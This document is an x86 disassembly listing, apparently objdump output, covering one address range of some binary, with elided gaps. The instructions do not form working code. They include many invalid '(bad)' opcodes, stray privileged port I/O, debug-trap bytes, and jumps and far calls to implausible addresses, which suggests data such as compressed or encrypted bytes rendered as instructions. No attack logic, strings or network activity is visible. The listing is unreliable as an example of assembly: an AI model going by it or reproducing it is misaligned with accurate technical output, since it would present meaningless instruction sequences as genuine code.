  429f39:	xchg   ebp,eax
  429f3a:	cmp    edi,DWORD PTR [ecx]
  429f3c:	mov    BYTE PTR [ecx+0x15dbd1d0],al
  429f42:	push   es
  429f43:	adc    BYTE PTR [edi],bh
  429f45:	mov    bl,0x6
  429f47:	inc    esp
  429f48:	fild   QWORD PTR [esi+0x77]
  429f4b:	shl    BYTE PTR [esp+ecx*8-0x43],1
  429f4f:	sub    DWORD PTR [edi+0x75b0fb39],0xffffffed
  429f56:	mov    al,0x2
  429f58:	jne    0x429f82
  429f5a:	popf   
  429f5b:	dec    edi
  429f5c:	dec    ebp
  429f5d:	repz xlat BYTE PTR ds:[bx]
  429f60:	adc    bl,dl
  429f62:	inc    eax
  429f63:	or     eax,0x2dce9b21
  429f68:	adc    BYTE PTR [ebx],cl
  429f6a:	inc    edx
  429f6b:	xor    eax,0xd2
	...
  429fd4:	add    BYTE PTR [eax],al
  429fd6:	xor    DWORD PTR [ebp-0x38],eax
  429fd9:	push   es
  429fda:	cld    
  429fdb:	(bad)  
  429fdc:	push   DWORD PTR [edi-0x50]
  429fdf:	cld    
  429fe0:	sbb    esp,DWORD PTR [ebx-0x5b20f11d]
  429fe6:	jl     0x429fa9
  429fe8:	add    DWORD PTR [eax],eax
  429fea:	inc    DWORD PTR [eax]
  429fec:	add    BYTE PTR [eax],al
  429fee:	push   esi
  429fef:	lods   eax,DWORD PTR ds:[esi]
  429ff1:	or     BYTE PTR [ebx+0xa1a996],bl
  429ff7:	adc    eax,0x1d87f368
  429ffc:	mov    bh,0xac
  429ffe:	repnz scas eax,DWORD PTR es:[edi]
  42a000:	jl     0x429fa2
  42a002:	data16 jg 0x42a022
  42a005:	inc    esp
  42a006:	xchg   esi,eax
  42a007:	ret    0xf899
  42a00a:	push   ds
  42a00b:	jle    0x42a018
  42a00d:	int    0x92
  42a00f:	(bad)  
  42a010:	and    al,0x8e
  42a012:	test   DWORD PTR [esi-0x4c],esi
  42a015:	ffree  st(1)
  42a017:	or     BYTE PTR [esi-0x1fa2d023],ah
  42a01d:	jmp    0x42a051
  42a01f:	or     eax,0xd0f8b2b5
  42a024:	int3   
  42a025:	jg     0x42a092
  42a027:	rcl    DWORD PTR [ebp-0x38f0778f],0x6b
  42a02e:	mov    ebp,0x75bb29c8
  42a033:	mov    WORD PTR [esi],?
  42a035:	xchg   edx,eax
  42a036:	jae    0x42a026
  42a038:	push   ds
  42a039:	mov    ah,0x80
  42a03b:	sbb    al,0x15
  42a03d:	je     0x42a0ab
  42a03f:	sub    cl,BYTE PTR [ecx-0x60bd09dd]
  42a045:	es jno 0x42a0b5
  42a048:	adc    edi,DWORD PTR [eax]
  42a04a:	in     al,dx
  42a04b:	mov    WORD PTR [esi+0x47df54b8],fs
  42a051:	test   al,0x1d
  42a053:	popa   
  42a054:	icebp  
  42a055:	lods   al,BYTE PTR ds:[esi]
  42a056:	pop    edi
  42a057:	les    ebp,FWORD PTR [edx-0x8e2c898]
  42a05d:	jbe    0x42a0af
  42a05f:	idiv   cl
  42a061:	ins    DWORD PTR es:[edi],dx
  42a062:	ror    BYTE PTR [ebx],0x1d
  42a065:	in     eax,0xea
  42a067:	cdq    
  42a068:	mov    bl,0x55
  42a06a:	jge    0x429ff3
  42a06c:	push   ecx
  42a06d:	mov    bh,0xb9
  42a06f:	fcom   DWORD PTR [ecx]
  42a071:	je     0x42a04d
  42a073:	and    al,0x7f
  42a075:	sub    eax,0xafbf6ab3
  42a07a:	add    cl,BYTE PTR [ecx+edx*8-0x78]
  42a07e:	shl    DWORD PTR ds:0xbe4b5a22,0x22
  42a085:	(bad)  
  42a087:	mov    ds:0x57f10405,al
  42a08c:	mov    edx,DWORD PTR cs:[ecx]
  42a08f:	aaa    
  42a090:	ins    DWORD PTR es:[edi],dx
  42a091:	mov    esi,0x75b58ab3
  42a096:	sbb    al,BYTE PTR [ebp+0x2c2d175d]
  42a09c:	mov    BYTE PTR [edi+ebp*2],dh
  42a09f:	push   es
  42a0a0:	popa   
  42a0a1:	add    edi,DWORD PTR [esi]
  42a0a3:	iret   
  42a0a4:	sbb    ch,al
  42a0a6:	push   edx
  42a0a7:	mov    ecx,0xc6490319
  42a0ac:	pusha  
  42a0ad:	(bad)  
  42a0af:	arpl   WORD PTR [esi-0x43ba34d7],bx
  42a0b5:	pushf  
  42a0b6:	nop
  42a0b7:	addr16 dec esi
  42a0b9:	mov    ds:0x15a1d8ec,eax
  42a0be:	sbb    al,0x37
  42a0c0:	div    bh
  42a0c2:	ds dec ebp
  42a0c4:	mov    ds:0x77f76171,al
  42a0c9:	and    eax,0x1c018adb
  42a0ce:	push   edi
  42a0cf:	add    ah,BYTE PTR [edi-0x11880800]
  42a0d5:	rol    DWORD PTR [ecx+0x7e],0xa3
  42a0d9:	(bad)  
  42a0db:	cmp    edx,DWORD PTR [eax-0x1da2ff44]
  42a0e1:	cmp    eax,0x79539dc9
  42a0e6:	fs adc eax,0x92bca78
  42a0ec:	repnz add BYTE PTR [eax],al
	...
  42a153:	add    BYTE PTR [eax],al
  42a155:	add    bh,dl
  42a157:	pushf  
  42a158:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a15f:	call   FWORD PTR [ebx]
  42a161:	(bad)  
  42a162:	lock adc cl,BYTE PTR [edx+0x1c27bfe]
  42a169:	add    bh,bh
  42a16b:	add    BYTE PTR [eax],al
  42a16d:	add    BYTE PTR [ecx+0x2a38f0a2],dh
  42a173:	fstp   QWORD PTR [ebp+0x32832903]
  42a179:	add    BYTE PTR ds:0x839e4c6b,0xfe
  42a180:	(bad)  
  42a181:	sbb    edx,DWORD PTR [edi-0x50]
  42a184:	push   ebp
  42a185:	cmp    esi,DWORD PTR [ecx+0x38]
  42a188:	fdecstp 
  42a18a:	outs   dx,BYTE PTR ds:[esi]
  42a18b:	dec    esp
  42a18c:	pop    esi
  42a18d:	or     BYTE PTR [ebx-0x4d],ch
  42a190:	inc    esp
  42a191:	jmp    0xda219e87
  42a196:	je     0x42a1b2
  42a198:	enter  0x4307,0xb0
  42a19c:	xchg   ebx,eax
  42a19d:	jg     0x42a18c
  42a19f:	inc    edi
  42a1a0:	xchg   esi,eax
  42a1a1:	mov    bh,0xd4
  42a1a3:	out    dx,al
  42a1a4:	jg     0x42a213
  42a1a6:	es jnp 0x42a18b
  42a1a9:	adc    eax,0x69304fa5
  42a1ae:	out    0xa4,eax
  42a1b0:	shl    DWORD PTR [ecx-0x13be3224],1
  42a1b6:	push   0x91fccf39
  42a1bb:	add    al,0xda
  42a1bd:	sbb    ah,BYTE PTR [edi+0x16a31948]
  42a1c3:	jge    0x42a185
  42a1c5:	rcl    bh,1
  42a1c7:	sbb    BYTE PTR [ebp+0x73e2eae3],0x78
  42a1ce:	fild   QWORD PTR [esi-0x34]
  42a1d1:	icebp  
  42a1d2:	ss in  eax,dx
  42a1d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a1d5:	(bad)  
  42a1d6:	std    
  42a1d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a1d8:	out    0x2c,ax
  42a1db:	xor    eax,0x97c19edd
  42a1e0:	icebp  
  42a1e1:	and    BYTE PTR [edi+0x29],cl
  42a1e4:	sahf   
  42a1e5:	mov    DWORD PTR [ecx+0x14cb3351],edi
  42a1eb:	fadd   QWORD PTR [eax+0x68a7ff14]
  42a1f1:	jb     0x42a1e4
  42a1f3:	add    cl,BYTE PTR [ebp+edi*4-0x3a]
  42a1f7:	sbb    al,0xd8
  42a1f9:	mov    al,ds:0x37bf26a6
  42a1fe:	out    dx,al
  42a1ff:	stos   DWORD PTR es:[edi],eax
  42a200:	mov    es,WORD PTR [edi-0x27e83f31]
  42a206:	dec    ecx
  42a207:	sub    eax,0x4d19ae1c
  42a20c:	and    al,BYTE PTR [edx]
  42a20e:	xor    al,0xd8
  42a210:	pop    edi
  42a211:	mov    ebx,0x4e7a04bb
  42a216:	jb     0x42a23d
  42a218:	out    dx,al
  42a219:	jecxz  0x42a1c7
  42a21b:	test   al,0xf9
  42a21d:	sahf   
  42a21e:	dec    ecx
  42a21f:	test   BYTE PTR [ecx+0x52],dl
  42a222:	sbb    al,0xd5
  42a224:	and    bl,bl
  42a226:	add    bh,0x9
  42a229:	test   bh,dh
  42a22b:	sub    ecx,DWORD PTR [ebx-0x47ab5bf7]
  42a231:	aaa    
  42a232:	cs test eax,0x6cde8d28
  42a238:	test   al,0x4e
  42a23a:	(bad)  
  42a23b:	fsub   DWORD PTR [edx]
  42a23d:	mov    bh,0x5e
  42a23f:	jmp    0xead91081
  42a244:	imul   ecx,esi,0x2b989af2
  42a24a:	call   0x42dd8a86
  42a24f:	js     0x42a236
  42a251:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a252:	in     al,0xc
  42a254:	test   BYTE PTR [ebx+ebx*2],bh
  42a257:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  42a259:	es mov dl,0xb8
  42a25c:	push   ebp
  42a25d:	xchg   edi,eax
  42a25e:	call   0x29bc:0x4d2b3ce5
  42a265:	js     0x42a285
  42a267:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a268:	add    edx,DWORD PTR [eax]
  42a26a:	(bad)  
  42a26c:	xchg   ebp,eax
	...
  42a2d5:	add    BYTE PTR [ebx],ch
  42a2d7:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a2dd:	mov    bh,0x1a
  42a2df:	aas    
  42a2e0:	scas   al,BYTE PTR es:[edi]
  42a2e1:	fldz   
  42a2e3:	xor    esi,DWORD PTR [ebx-0x71]
  42a2e6:	jp     0x42a2ab
  42a2e8:	add    DWORD PTR [eax],eax
  42a2ea:	inc    DWORD PTR [eax]
  42a2ec:	add    BYTE PTR [eax],al
  42a2ee:	pop    esp
  42a2ef:	add    DWORD PTR [ebp+0x7b],ebx
  42a2f2:	cmp    cl,bh
  42a2f4:	cs dec ebp
  42a2f6:	out    0x72,eax
  42a2f8:	sub    ebp,ebx
  42a2fa:	cmp    eax,DWORD PTR [ebp+0x65]
  42a2fd:	xor    bh,BYTE PTR [ebx+0x3898fc7d]
  42a303:	(bad)  
  42a304:	mov    esi,ecx
  42a306:	mov    bl,0xc2
  42a308:	pop    esp
  42a309:	dec    edx
  42a30a:	mov    cl,0xb2
  42a30c:	aad    0xf2
  42a30e:	sbb    cl,BYTE PTR [ebx]
  42a310:	fwait
  42a311:	or     eax,DWORD PTR [ebx+0x5f]
  42a314:	(bad)  
  42a315:	jnp    0x42a346
  42a317:	xchg   ebp,eax
  42a318:	sbb    eax,0xfb12fdea
  42a31d:	es adc eax,0x3092bd7
  42a323:	lea    eax,[ebx-0x18f969a7]
  42a329:	stos   BYTE PTR es:[edi],al
  42a32a:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  42a32c:	(bad)  
  42a32e:	int    0x25
  42a330:	mov    ah,0x89
  42a332:	mov    ecx,0xb0f86386
  42a337:	xlat   BYTE PTR ds:[ebx]
  42a338:	out    0x41,eax
  42a33a:	and    al,0x5f
  42a33c:	aam    0x45
  42a33e:	shl    al,cl
  42a340:	in     eax,0x42
  42a342:	dec    ecx
  42a343:	mov    bh,0xa6
  42a345:	shl    BYTE PTR [edi-0x283d52b7],cl
  42a34b:	push   cs
  42a34c:	jecxz  0x42a39b
  42a34e:	pop    es
  42a34f:	repz cmp BYTE PTR [ebp-0x8],dl
  42a353:	pop    esi
  42a354:	jecxz  0x42a3d2
  42a356:	or     bh,cl
  42a358:	push   ss
  42a359:	jbe    0x42a39b
  42a35b:	es popf 
  42a35d:	popa   
  42a35e:	cwde   
  42a35f:	fidivr WORD PTR [ebp-0x47]
  42a362:	mov    dh,0xc4
  42a364:	pop    edx
  42a365:	icebp  
  42a366:	inc    ebx
  42a367:	push   0x34
  42a369:	mov    eax,0x17b21021
  42a36e:	mov    edx,0xe89e719d
  42a373:	sbb    al,BYTE PTR [edx*1-0x33d675c3]
  42a37a:	enter  0x2bb3,0x1f
  42a37e:	aaa    
  42a37f:	paddw  mm1,mm5
  42a382:	js     0x42a397
  42a384:	inc    ebp
  42a385:	cdq    
  42a386:	fdiv   QWORD PTR [edi-0x110004ae]
  42a38c:	sub    esi,DWORD PTR [eax-0x665948ab]
  42a392:	xor    cl,BYTE PTR [esi]
  42a394:	test   eax,0xd49b94d9
  42a399:	scas   al,BYTE PTR es:[edi]
  42a39a:	inc    ecx
  42a39b:	out    dx,eax
  42a39c:	repz inc eax
  42a39e:	pop    ebx
  42a39f:	push   ecx
  42a3a0:	add    eax,0x23142725
  42a3a5:	ret    
  42a3a6:	xchg   esp,eax
  42a3a7:	and    edi,DWORD PTR es:[eax-0x5d365ae6]
  42a3ae:	pop    edx
  42a3af:	push   eax
  42a3b0:	popf   
  42a3b1:	mov    al,ds:0x2b349496
  42a3b6:	or     esp,DWORD PTR [edi]
  42a3b8:	xchg   esp,eax
  42a3b9:	mov    esi,DWORD PTR [eax]
  42a3bb:	cmp    bl,dh
  42a3bd:	jp     0x42a3dc
  42a3bf:	pushf  
  42a3c0:	aas    
  42a3c1:	jge    0x42a3f0
  42a3c3:	(bad)  
  42a3c4:	jne    0x42a35e
  42a3c6:	add    eax,DWORD PTR [ebx+0x4d0d59f2]
  42a3cc:	and    DWORD PTR [ebp+0x4f1fa4c9],0x1c9762e5
  42a3d6:	ja     0x42a37a
  42a3d8:	pop    edi
  42a3d9:	inc    esi
  42a3da:	xor    BYTE PTR cs:[ebp+0x949b8b],0x3c
  42a3e2:	pop    edx
  42a3e3:	add    al,0x44
  42a3e5:	sbb    eax,0x7e742fd0
  42a3ea:	xlat   BYTE PTR ds:[ebx]
  42a3eb:	call   0x42a473
	...
  42a454:	add    BYTE PTR [eax],al
  42a456:	jg     0x42a466
  42a458:	jne    0x42a495
  42a45a:	jne    0x42a4d7
  42a45c:	jg     0x42a4ac
  42a45e:	loop   0x42a4c9
  42a460:	mov    ebp,0x7f3ea53d
  42a465:	aad    0x79
  42a467:	les    eax,FWORD PTR [ecx]
  42a469:	add    bh,bh
  42a46b:	add    BYTE PTR [eax],al
  42a46d:	add    BYTE PTR [eax],cl
  42a46f:	cld    
  42a470:	shl    DWORD PTR [ebx+edx*2+0x3a03c9de],0x4e
  42a478:	or     ebp,DWORD PTR [edi-0x7a]
  42a47b:	shl    BYTE PTR [ecx],0x6c
  42a47e:	or     BYTE PTR [ebx-0x63],0x2a
  42a482:	adc    dl,bl
  42a484:	jmp    0x42a49f
  42a486:	adc    BYTE PTR [eax-0x234e1112],ah
  42a48c:	jae    0x42a49c
  42a48e:	imul   esp,DWORD PTR [ebp+0x448b958f],0x364d9021
  42a498:	cli    
  42a499:	jecxz  0x42a4a3
  42a49b:	std    
  42a49c:	sti    
  42a49d:	sub    bl,BYTE PTR [ebp-0x3486b3e5]
  42a4a3:	jmp    0x97f94f12
  42a4a8:	test   eax,0xe6e402da
  42a4ad:	jl     0x42a4d9
  42a4af:	pop    eax
  42a4b0:	aad    0x83
  42a4b2:	add    al,0xd0
  42a4b4:	sar    BYTE PTR ds:0x5a1a7f76,0x64
  42a4bb:	mov    dh,BYTE PTR [esp+eiz*8]
  42a4be:	pop    ss
  42a4bf:	rcl    BYTE PTR [ecx+0x2e],1
  42a4c2:	xor    eax,0x777f6ed7
  42a4c7:	mov    edi,0xd6a15768
  42a4cc:	sbb    DWORD PTR [esi],0xffffffb9
  42a4cf:	inc    dl
  42a4d1:	mov    ch,0x21
  42a4d3:	add    al,0x9d
  42a4d5:	sub    eax,0x9be18853
  42a4da:	cmp    al,0x72
  42a4dc:	mov    ebx,0x63686ed7
  42a4e1:	push   es
  42a4e2:	adc    eax,0x7be9362
  42a4e7:	mov    dl,0x9c
  42a4e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a4ea:	fld    DWORD PTR [ecx-0x1f1b576d]
  42a4f0:	xor    BYTE PTR [ebx],dl
  42a4f2:	lds    edx,FWORD PTR [ecx+ebp*8+0x29]
  42a4f6:	mov    ebp,ebx
  42a4f8:	iret   
  42a4f9:	gs mov al,0xdc
  42a4fc:	push   eax
  42a4fd:	repnz pop DWORD PTR [edi+0x39d03067]
  42a504:	stos   DWORD PTR es:[edi],eax
  42a505:	inc    ebx
  42a506:	mov    esp,DWORD PTR [ebx]
  42a508:	hlt    
  42a509:	mov    DWORD PTR [ebx],edx
  42a50b:	ds push ds
  42a50d:	mov    ah,0x4a
  42a50f:	nop
  42a510:	mov    esi,0x55cb88fc
  42a515:	shl    dl,cl
  42a517:	mov    bh,0x68
  42a519:	sbb    cl,BYTE PTR [eax]
  42a51b:	add    bh,BYTE PTR ds:0x8c01b963
  42a521:	inc    ecx
  42a522:	dec    edx
  42a523:	lods   eax,DWORD PTR ds:[esi]
  42a524:	mov    dl,0xce
  42a526:	dec    ecx
  42a527:	fcomp  QWORD PTR [edx-0x188d6d29]
  42a52d:	jae    0x42a5a5
  42a52f:	jb     0x42a4b3
  42a531:	add    eax,0xdf033dc5
  42a536:	fwait
  42a537:	add    eax,0x89b25b42
  42a53c:	pusha  
  42a53d:	(bad)  
  42a53e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a53f:	pop    ebp
  42a540:	(bad)  
  42a541:	fimul  DWORD PTR [ebx-0x4b]
  42a544:	sub    esi,edx
  42a546:	mov    eax,0xc401684b
  42a54b:	fiadd  WORD PTR [edi-0x73]
  42a54e:	fs jmp 0x42a523
  42a551:	ja     0x42a50d
  42a553:	(bad)
  42a556:	cmp    eax,0x2bff718
  42a55b:	fwait
  42a55c:	push   eax
  42a55d:	int    0x14
  42a55f:	or     BYTE PTR [esi+0x5d7a67bc],bl
  42a565:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a566:	fcom   DWORD PTR [ebp-0x7a]
  42a569:	lods   al,BYTE PTR ds:[esi]
  42a56a:	sub    eax,0x1568
	...
  42a5d3:	add    BYTE PTR [eax],al
  42a5d5:	add    BYTE PTR [eax],bl
  42a5d7:	dec    edi
  42a5d8:	pop    ss
  42a5d9:	mov    ecx,0xefbef957
  42a5de:	(bad)  
  42a5df:	cmc    
  42a5e0:	mov    edx,0xc49da9f
  42a5e5:	fistp  QWORD PTR [eax-0x3b]
  42a5e8:	add    DWORD PTR [eax],eax
  42a5ea:	inc    DWORD PTR [eax]
  42a5ec:	add    BYTE PTR [eax],al
  42a5ee:	jecxz  0x42a645
  42a5f0:	ss jl  0x42a606
  42a5f3:	ficom  DWORD PTR [esi]
  42a5f5:	pop    es
  42a5f6:	je     0x42a665
  42a5f8:	repnz call 0x3d09:0x40972b77
  42a600:	add    al,0xa0
  42a602:	pop    ds
  42a603:	jmp    0x42a665
  42a605:	sbb    al,0x6d
  42a607:	inc    edx
  42a608:	inc    eax
  42a609:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a60a:	lea    edx,ds:0xb761bc72
  42a610:	pop    ebx
  42a611:	jnp    0x42a64c
  42a613:	cdq    
  42a614:	aad    0x8a
  42a616:	(bad)  
  42a617:	rcl    DWORD PTR [ebx],1
  42a619:	add    al,0xad
  42a61b:	(bad)  
  42a61c:	fwait
  42a61d:	ins    DWORD PTR es:[edi],dx
  42a61e:	gs retf 0xa6c7
  42a622:	pop    ebp
  42a623:	or     al,0xa0
  42a625:	pop    es
  42a626:	jmp    0x30c0a3f7
  42a62b:	inc    ebp
  42a62c:	push   edx
  42a62d:	push   cs
  42a62e:	(bad)  
  42a62f:	(bad)  [esi-0x44e6f3be]
  42a635:	lea    ecx,[edx+ecx*2-0x2a]
  42a639:	inc    ebp
  42a63a:	add    al,0x68
  42a63c:	imul   ebp,esi,0x25
  42a63f:	div    DWORD PTR [edx]
  42a641:	jl     0x42a613
  42a643:	cli    
  42a644:	sub    cl,cl
  42a646:	aam    0xda
  42a648:	mov    ds:0xf5eecf5b,eax
  42a64d:	xchg   edx,eax
  42a64e:	adc    bl,0x79
  42a651:	sbb    DWORD PTR [ecx-0x66],esp
  42a654:	int3   
  42a655:	call   0x96afd5d2
  42a65a:	ficom  DWORD PTR [edi]
  42a65c:	fisttp DWORD PTR [eax]
  42a65e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a65f:	mov    bh,0x86
  42a661:	in     al,dx
  42a662:	bound  esp,QWORD PTR [ebp-0x36358f49]
  42a668:	enter  0x8a84,0x49
  42a66c:	jns    0x42a6c4
  42a66e:	pusha  
  42a66f:	adc    esp,eax
  42a671:	jbe    0x42a698
  42a673:	fsubr  DWORD PTR [esp+eax*8+0x4d]
  42a677:	dec    eax
  42a678:	mov    bh,BYTE PTR [ebx+0x1b]
  42a67b:	js     0x42a6de
  42a67d:	js     0x42a6ac
  42a67f:	jbe    0x42a662
  42a681:	in     al,dx
  42a682:	add    dh,BYTE PTR [ecx]
  42a684:	stos   DWORD PTR es:[edi],eax
  42a685:	dec    esi
  42a686:	cmc    
  42a687:	mov    ch,0xeb
  42a689:	test   BYTE PTR [edi-0x2e],al
  42a68c:	xor    al,0x16
  42a68e:	jbe    0x42a6fc
  42a690:	pop    es
  42a691:	loop   0x42a68d
  42a693:	es or  al,0x6d
  42a696:	lock sub ch,BYTE PTR [ebp+0x5f]
  42a69a:	jmp    0x42a670
  42a69c:	mov    eax,ds:0xba005732
  42a6a1:	sti    
  42a6a2:	push   ecx
  42a6a3:	push   edi
  42a6a4:	xor    ch,al
  42a6a6:	mov    DWORD PTR [ebx-0x6b],ebp
  42a6a9:	adc    bh,BYTE PTR [esi+ebp*8]
  42a6ac:	sbb    al,0x84
  42a6ae:	sti    
  42a6af:	rcl    ecx,1
  42a6b1:	xchg   edi,eax
  42a6b2:	or     eax,0xc506fbe9
  42a6b7:	dec    edx
  42a6b8:	out    dx,eax
  42a6b9:	and    dh,BYTE PTR [edx+0x46fcd561]
  42a6bf:	loope  0x42a6a0
  42a6c1:	mov    ds:0x635ec0b4,eax
  42a6c6:	mov    al,ds:0xb58a9d13
  42a6cb:	fistp  QWORD PTR [ebp+0x50]
  42a6ce:	aas    
  42a6cf:	inc    ebx
  42a6d0:	mov    ebp,0x7dd1e836
  42a6d5:	push   ebp
  42a6d6:	in     al,dx
  42a6d7:	xchg   DWORD PTR [ecx+0x68b946ee],esp
  42a6dd:	fdivr  DWORD PTR [esi-0x585d4836]
  42a6e3:	arpl   WORD PTR [esi+0x2db4e6ef],bx
  42a6e9:	add    al,0xdb
  42a6eb:	mov    al,0xe7
	...
  42a755:	add    BYTE PTR [esi+edx*1],ah
  42a758:	outs   dx,BYTE PTR ds:[esi]
  42a759:	(bad)  
  42a75a:	jle    0x42a75b
  42a75c:	lods   eax,DWORD PTR ds:[esi]
  42a75d:	test   DWORD PTR [edi+0x51b8131c],0x7729a9f2
  42a767:	mov    BYTE PTR [ecx],0x0
  42a76a:	inc    DWORD PTR [eax]
  42a76c:	add    BYTE PTR [eax],al
  42a76e:	add    dl,BYTE PTR [eax+0x24]
  42a771:	test   BYTE PTR [eax-0x1ad74fc3],ah
  42a777:	and    eax,0xeed8b82f
  42a77c:	loope  0x42a78d
  42a77e:	sbb    DWORD PTR [edx-0x4],ecx
  42a781:	aad    0x3
  42a783:	test   al,0x16
  42a785:	fwait
  42a786:	xlat   BYTE PTR ds:[ebx]
  42a787:	dec    edx
  42a788:	outs   dx,DWORD PTR ds:[esi]
  42a789:	sbb    eax,0x8404f3aa
  42a78e:	sub    BYTE PTR [edi+0x4ba0ffa5],bl
  42a794:	int    0x3e
  42a796:	sub    eax,0x3abcd6e7
  42a79b:	cmp    al,0xf7
  42a79d:	bound  ebp,QWORD PTR [ecx+eiz*4-0x7375d6c6]
  42a7a4:	xor    ebp,ecx
  42a7a6:	daa    
  42a7a7:	mov    dl,0xba
  42a7a9:	xor    al,0xf3
  42a7ab:	repz cmp BYTE PTR [eax-0x1e],ah
  42a7af:	xor    DWORD PTR [edi],ebp
  42a7b1:	fistp  WORD PTR [edx]
  42a7b3:	pop    es
  42a7b4:	mov    ds:0x3790f518,eax
  42a7b9:	push   0x8633af
  42a7be:	xlat   BYTE PTR ds:[ebx]
  42a7bf:	jb     0x42a7f0
  42a7c1:	or     BYTE PTR [edi-0x3dee007b],al
  42a7c7:	lds    edx,FWORD PTR [eax]
  42a7c9:	jnp    0x42a75e
  42a7cb:	aam    0x66
  42a7cd:	jne    0x42a7ba
  42a7cf:	fadd   QWORD PTR [ebp+0xbbe3597]
  42a7d5:	cli    
  42a7d6:	jp     0x42a7e6
  42a7d8:	mov    BYTE PTR [ebp+0x17],al
  42a7db:	sub    al,0x57
  42a7dd:	enter  0x3405,0x36
  42a7e1:	push   ecx
  42a7e2:	cld    
  42a7e3:	sahf   
  42a7e4:	xor    ebx,eax
  42a7e6:	mov    dh,0xbb
  42a7e8:	adc    al,0xab
  42a7ea:	cmp    edi,DWORD PTR ss:[edi-0x464f60ee]
  42a7f1:	int3   
  42a7f2:	mov    ebx,0x14e1dad8
  42a7f7:	out    0xe0,al
  42a7f9:	pushf  
  42a7fa:	jnp    0x42a807
  42a7fc:	mov    ah,0x1d
  42a7fe:	loope  0x42a7f7
  42a800:	ja     0x42a7c2
  42a802:	push   ds
  42a803:	pusha  
  42a804:	sub    BYTE PTR [ecx+0x47],bh
  42a807:	clc    
  42a808:	inc    edx
  42a809:	and    ecx,DWORD PTR [esi+0x3f]
  42a80c:	cdq    
  42a80d:	inc    ebp
  42a80e:	data16 rcr BYTE PTR [eax],0x6e
  42a812:	iret   
  42a813:	dec    esi
  42a814:	fsubr  QWORD PTR [esi-0x7e392bd7]
  42a81a:	ret    
  42a81b:	xchg   ebp,eax
  42a81c:	mov    DWORD PTR [esi],ecx
  42a81e:	test   al,0xa2
  42a820:	ja     0x42a85c
  42a822:	xor    al,0xb8
  42a824:	call   0xac95cf5f
  42a829:	sbb    esp,ecx
  42a82b:	out    0xd3,al
  42a82d:	jno    0x42a842
  42a82f:	loop   0x42a835
  42a831:	retf   
  42a832:	dec    ebx
  42a833:	push   ebx
  42a834:	push   cs
  42a835:	pop    eax
  42a836:	mov    ch,0x46
  42a838:	xchg   ebp,eax
  42a839:	or     eax,DWORD PTR [ecx]
  42a83b:	dec    edx
  42a83c:	into   
  42a83d:	pop    edx
  42a83e:	push   ss
  42a83f:	ror    ch,0x8f
  42a842:	dec    DWORD PTR [ebx+esi*1+0x5699a137]
  42a849:	bound  ecx,QWORD PTR [edi-0x57da8a7e]
  42a84f:	icebp  
  42a850:	fucom  st(2)
  42a852:	xchg   DWORD PTR [edi-0x58562df6],ebp
  42a858:	pop    edi
  42a859:	cmp    al,0x9a
  42a85b:	lods   al,BYTE PTR ds:[esi]
  42a85c:	dec    eax
  42a85d:	add    eax,ecx
  42a85f:	pop    edi
  42a860:	in     eax,dx
  42a861:	stos   DWORD PTR es:[edi],eax
  42a862:	push   esi
  42a863:	ss xchg ebp,eax
  42a865:	dec    ebp
  42a866:	(bad)  
  42a867:	fiadd  WORD PTR [ecx]
  42a869:	mov    dl,BYTE PTR [esi]
  42a86b:	mov    esp,0x64
	...
  42a8d4:	add    BYTE PTR [eax],al
  42a8d6:	mov    ah,BYTE PTR [ebp+0x63]
  42a8d9:	mov    edi,0x75debfef
  42a8de:	add    ebp,0xa9426c97
  42a8e4:	jns    0x42a89c
  42a8e6:	jbe    0x42a8af
  42a8e8:	add    DWORD PTR [eax],eax
  42a8ea:	inc    DWORD PTR [eax]
  42a8ec:	add    BYTE PTR [eax],al
  42a8ee:	mov    bl,0xdc
  42a8f0:	ins    BYTE PTR es:[edi],dx
  42a8f1:	shr    BYTE PTR [ebx-0x4f],0x40
  42a8f5:	push   esp
  42a8f6:	push   cs
  42a8f7:	int    0x88
  42a8f9:	sar    BYTE PTR [ebx+eiz*4],0x39
  42a8fd:	aam    0x3
  42a8ff:	dec    esi
  42a900:	stc    
  42a901:	out    0x72,al
  42a903:	jg     0x42a8a7
  42a905:	jbe    0x42a8e8
  42a907:	and    al,BYTE PTR [ecx-0x4d]
  42a90a:	mov    DWORD PTR [esi+esi*1+0x3cb4837d],esp
  42a911:	jecxz  0x42a983
  42a913:	(bad)  
  42a915:	mov    al,0xca
  42a917:	cmp    eax,0xab1a016
  42a91c:	aam    0x90
  42a91e:	sub    ecx,edi
  42a920:	fild   DWORD PTR [esi]
  42a922:	test   DWORD PTR [esi-0x7f],ebx
  42a925:	out    dx,al
  42a926:	in     al,dx
  42a927:	mov    eax,0x430f85d
  42a92c:	lods   eax,DWORD PTR ds:[esi]
  42a92d:	gs inc ebp
  42a92f:	(bad)  
  42a930:	and    ebx,DWORD PTR [ecx]
  42a932:	loop   0x42a905
  42a934:	comiss xmm0,DWORD PTR [ebx-0x1235f704]
  42a93b:	jbe    0x42a92e
  42a93d:	es sti 
  42a93f:	aad    0xa9
  42a941:	sbb    DWORD PTR [ebx+0x944923f],edi
  42a947:	add    BYTE PTR [edx+edx*1+0x4267504a],ch
  42a94e:	mov    cl,BYTE PTR [edi]
  42a950:	shr    DWORD PTR [ebx+0x54],cl
  42a953:	mul    DWORD PTR [ebp+0x77dd37aa]
  42a959:	jmp    0x5ec0:0xd72bb12c
  42a960:	outs   dx,BYTE PTR ds:[esi]
  42a961:	outs   dx,BYTE PTR ds:[esi]
  42a962:	outs   dx,DWORD PTR ds:[esi]
  42a963:	adc    ah,BYTE PTR [ecx-0x70]
  42a966:	cmp    BYTE PTR [eax-0x1e],dh
  42a969:	hlt    
  42a96a:	retf   
  42a96b:	daa    
  42a96c:	nop
  42a96d:	adc    ah,BYTE PTR [edi+0x6a]
  42a970:	rol    bh,cl
  42a972:	aam    0xe0
  42a974:	std    
  42a975:	inc    esp
  42a976:	xchg   esp,eax
  42a977:	imul   edx,DWORD PTR [esi+0x36],0x15
